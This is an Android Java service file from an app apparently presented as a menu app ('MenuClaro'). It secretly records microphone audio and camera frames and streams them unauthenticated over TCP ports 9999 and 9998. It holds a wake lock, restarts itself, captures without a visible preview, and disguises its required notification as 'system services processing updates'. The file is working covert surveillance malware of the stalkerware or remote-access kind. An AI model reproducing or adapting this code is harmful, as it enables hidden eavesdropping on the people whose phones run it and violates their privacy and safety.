package com.menuclaro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class StreamService extends Service {

    public static boolean isRunning = false;

    private static final String CHANNEL_ID = "MenuClaroService";
    private static final int PORT_AUDIO = 9999;
    private static final int PORT_VIDEO  = 9998;
    private static final int SAMPLE_RATE = 44100;
    private static final int WIDTH  = 640;
    private static final int HEIGHT = 480;

    private PowerManager.WakeLock wakeLock;
    private AudioRecord audioRecord;
    private Thread audioThread;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Thread videoThread;

    // Volatile so ImageReader listener always sees latest client
    private volatile OutputStream videoOutputStream = null;
    private volatile Socket currentVideoClient = null;

    private int currentCameraIndex = 0;
    private String[] cameraIds;
    private volatile boolean streaming = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startForegroundNotification();
        acquireWakeLock();
        startStreaming();
        isRunning = true;
        return START_STICKY;
    }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).build());
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MenuClaro::StreamWakeLock");
        wakeLock.acquire();
    }

    private void startStreaming() {
        streaming = true;
        startBackgroundThread();
        // Start camera ONCE - stays running forever
        startCamera();
        // Start servers - accept new clients in loop
        startAudioServer();
        startVideoServer();
    }

    // ─── AUDIO ───────────────────────────────────────────
    private void startAudioServer() {
        audioThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                try {
                    serverSocket = new ServerSocket(PORT_AUDIO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    int buf = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                    audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, buf * 4);
                    audioRecord.startRecording();

                    OutputStream out = client.getOutputStream();
                    byte[] buffer = new byte[2048];
                    while (streaming && !client.isClosed()) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) { out.write(buffer, 0, read); out.flush(); }
                    }
                } catch (Exception e) {
                    // client disconnected - loop will restart
                } finally {
                    try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException ie) { break; }
                }
            }
        });
        audioThread.setDaemon(true);
        audioThread.start();
    }

    // ─── VIDEO SERVER ─────────────────────────────────────
    // Camera stays running - just swap the output stream for each new client
    private void startVideoServer() {
        videoThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                try {
                    serverSocket = new ServerSocket(PORT_VIDEO);
                    serverSocket.setReuseAddress(true);

                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    // Disconnect previous client cleanly
                    if (currentVideoClient != null) {
                        try { currentVideoClient.close(); } catch (Exception ignored) {}
                    }

                    // Assign new output stream - ImageReader will start sending to it immediately
                    currentVideoClient = client;
                    videoOutputStream   = client.getOutputStream();

                    // Keep alive until disconnected
                    while (streaming && !client.isClosed()) {
                        Thread.sleep(300);
                    }
                } catch (Exception e) {
                    // disconnected
                } finally {
                    // Null out stream so ImageReader stops trying to send
                    videoOutputStream = null;
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException ie) { break; }
                }
            }
        });
        videoThread.setDaemon(true);
        videoThread.start();
    }

    // ─── CAMERA (starts once, runs forever) ──────────────
    private void startCamera() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            cameraIds = manager.getCameraIdList();
        } catch (CameraAccessException e) { cameraIds = new String[]{"0"}; }

        imageReader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2);
        imageReader.setOnImageAvailableListener(reader -> {
            android.media.Image image = reader.acquireLatestImage();
            if (image == null) return;
            try {
                if (videoOutputStream == null) return; // No client - skip frame
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                sendVideoFrame(bytes);
            } finally { image.close(); }
        }, backgroundHandler);

        openCamera();
    }

    private void openCamera() {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            manager.openCamera(cameraIds[currentCameraIndex], new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    startPreview();
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
                @Override public void onError(CameraDevice camera, int error) {
                    camera.close();
                    // Retry after 2 seconds
                    backgroundHandler.postDelayed(() -> openCamera(), 2000);
                }
            }, backgroundHandler);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void startPreview() {
        try {
            SurfaceTexture texture = new SurfaceTexture(0);
            texture.setDefaultBufferSize(WIDTH, HEIGHT);
            Surface dummy  = new Surface(texture);
            Surface reader = imageReader.getSurface();
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(reader);
            cameraDevice.createCaptureSession(Arrays.asList(dummy, reader),
                    new CameraCaptureSession.StateCallback() {
                        @Override public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                                session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) { e.printStackTrace(); }
                        }
                        @Override public void onConfigureFailed(CameraCaptureSession session) {}
                    }, backgroundHandler);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendVideoFrame(byte[] jpegBytes) {
        OutputStream out = videoOutputStream;
        if (out == null) return;
        try {
            int len = jpegBytes.length;
            byte[] header = new byte[]{(byte)(len>>24),(byte)(len>>16),(byte)(len>>8),(byte)len};
            out.write(header);
            out.write(jpegBytes);
            out.flush();
        } catch (Exception e) {
            videoOutputStream = null; // Client disconnected
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try { backgroundThread.join(); backgroundThread = null; backgroundHandler = null; }
            catch (InterruptedException e) { e.printStackTrace(); }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        streaming = false;
        isRunning = false;
        videoOutputStream = null;
        try {
            if (captureSession != null) { captureSession.close(); captureSession = null; }
            if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; }
            if (imageReader != null) { imageReader.close(); imageReader = null; }
            if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); }
        } catch (Exception e) { e.printStackTrace(); }
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        stopBackgroundThread();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
